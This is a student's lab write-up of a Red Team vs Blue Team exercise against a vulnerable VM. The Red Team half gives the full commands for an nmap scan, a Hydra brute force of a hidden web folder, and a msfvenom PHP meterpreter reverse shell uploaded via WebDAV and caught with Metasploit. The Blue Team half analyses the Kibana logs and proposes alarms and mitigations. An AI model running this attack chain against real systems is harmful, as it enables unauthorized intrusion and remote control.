# Red Team vs Blue Team

For this project, I worked on a Red Team vs. Blue Team scenario in which I played the role of both penetration tester and SOC analyst.
As the Red Team, I attacked a vulnerable Virtual Machine within my environment, and ultimately gained root access to the machine. As Blue Team, I used Kibana to review logs taken from when I attacked the vulernable machine. I then used the logs to extract hard data and visualizations for their report.
I created mitigation measures for each exploit that I've successfully performed.

## Red Team


-	I ran the command ***ifconfig*** to find the IP address of the capstone machine, which was the machine we were attacking.

![1a](https://user-images.githubusercontent.com/92223941/167281275-93a49077-e4fd-49b8-abb8-5996739eb5d8.PNG)

-	I then ran a Nmap command ***nmap -sV 192.168.1.105*** to find the open ports

![image](https://user-images.githubusercontent.com/92223941/167281224-191e434b-d94f-4a4b-a6fd-3515a2e9c02d.png)

-	I then went into the website to see to find any important directories. I was able to find a hidden directory at 192.168.1.105/company_folders/secret_folder that you need to login into as Ashton.

![image](https://user-images.githubusercontent.com/92223941/167281335-956344b0-fdd2-4bee-af89-ebb9f989ae2c.png)

-	On the Kali machine, I ran the Hydra tool with the command ***hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get http://192.168.1.105/company_folders/secret_folder*** on it that used brute force into the wordlist and found the password for it.

![Hydra password](https://user-images.githubusercontent.com/92223941/167281384-6f05f062-0e78-4dce-ad56-1fad9ec91fe1.PNG)

-	I then logged into the secret folder and found a personal note in it.

![image](https://user-images.githubusercontent.com/92223941/167281416-4ab1c2f6-beef-43a8-808b-4bbf5874493d.png)

-	After reading the personal note, I copied the hashed text that was was left for Ryan's account and put it on https://crackstation.net/ and cracked it on the website.

![ryan password](https://user-images.githubusercontent.com/92223941/167281434-8f81988d-a4f1-4695-b83e-bb06cc285285.PNG)

-	Now that I have username and password for Ryan, I can now create my php shell to put on their website. I did so by doing this command ***msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=80 -f raw > shell.php***

![msfvenom](https://user-images.githubusercontent.com/92223941/167281455-8e01b643-d192-4939-8992-b3dca42cdc39.PNG)

-	I then uploaded the shell into the webdav directory.

![image](https://user-images.githubusercontent.com/92223941/167281502-8d68b727-b8e0-49b1-8bdf-87dc7e35cabb.png)

-	I then ran Metasploit to listen to the shell on the target machine, so I can access it via remote. The commands I ran were:

	-	***msfconsole***
	-	***use exploit/multi/handler***
	-	***set payload php/meterpreter/reverse_tcp***
	-	***set LHOST 192.168.1.90***
	-	***set LPORT 80***
	-	***show options***
	-	***run***

![snip 2](https://user-images.githubusercontent.com/92223941/167281556-7176de74-2fec-4aad-81e9-ae500111a626.PNG)

-	I then clicked on the shell on the website after I ran the Metasploit and I was able now to now get remote access to the target machine.

-	I then ran the command ***shell*** and went back to the root directory and then listed the directories and found the flag.

![6](https://user-images.githubusercontent.com/92223941/167281652-3aa24019-0640-4643-a46b-da75072434c6.PNG)
![7](https://user-images.githubusercontent.com/92223941/167281666-b48aaa30-140d-463c-8287-3653eb305899.PNG)



## Blue Team

-	Analysis: Identifying the Port Scan
	-	The port scan occurred on April 6 12 am
	-	162,551 packets were sent from the machine 192.168.1.90
	-	The massive rise in the network traffic indicates that it is a Port Scan

![Port Scan](https://user-images.githubusercontent.com/92223941/167281697-d81d864f-0edc-4bc9-a8a3-e780750f5eba.PNG)

-	Analysis: Finding the Request for the hidden directory
	-	The requested occurred for this URL path on April 6 12 and there were 99,596 requests made to it
	-	The file that was requested was the secret_folder and it contained the hashed password for Ryan's account and the web address to login into

![http request](https://user-images.githubusercontent.com/92223941/167281725-b7ed6d0c-a722-4e69-b8e9-336be079fc9a.PNG)

-	Analysis: Uncovering the Brute Force Attack
	-	99,596 requests were made during the brute force attack to get into the secret folder directory
	-	99,577 requests were made before the attacker found out the password

![brute force attack blue team](https://user-images.githubusercontent.com/92223941/167281750-4c8eb6bf-d727-4fc0-a298-ea743b98926a.PNG)

-	Analysis: Finding the WebDAV Connection
	-	60 requests were made to this directory
	-	Shell files were requested

![webdav](https://user-images.githubusercontent.com/92223941/167281770-7b3f00c8-18da-4851-9339-833991e72a6b.PNG)

## Blue Team Proposed Alarms and Mitigation Strategies

-	Mitigation: Blocking the Port Scan
	-	Alarm
		-	An alert for port scanning can be set to the threshold of 10
	-	System Hardening
		-	The configurations I would set up on the host to mitigate the port scans would be to put up a firewall and close ports 80 and 22. Make sure the server doesnâ€™t response to ICMP requests.

-	Mitigation: Finding the Request for the Hidden Directory
	-	Alarm
		-	I would make an alarm when request for secret folders and files are made and set threshold to 1
	-	System Hardening
		-	To block unwanted access on the host I would not make secret folders accessible for public access. Make complicated passwords and reset password every 3 months.


-	Mitigation: Preventing Brute Force Attacks
	-	Alarm
		-	To detect future brute force attacks, I would set an alert after 3 bad login attempts send a text message or email to the user and manager about activity, after 5 bad logins attempts, reset the password.
	-	System Hardening
		-	I would close ports 22 and 80. Add firewall, encrypt, and hash profiled information as configuration to block brute force attacks on host

-	Mitigation: Detecting the WebDAV Connection
	-	Alarm
		-	I would set the alarm for alert for number of times a file requested in webdav by non-trusted ip address and threshold to 10 to detect future access to this directory
	-	System Hardening
		-	The configuration that can be set on the host to control access is Multi factor login, change password every few months, only specific users have access to WebDav.

-	Mitigation: Identifying Reverse Shell Uploads
	-	Alarm
		-	I would set the alarm for alert for number of times for any shell upload with the threshold of 1 to detect future file uploads
	-	System Hardening
		-	The configuration that can be set on the host to block file upload would be close the ports, strong firewall. Set remote execution to block on the server.



 
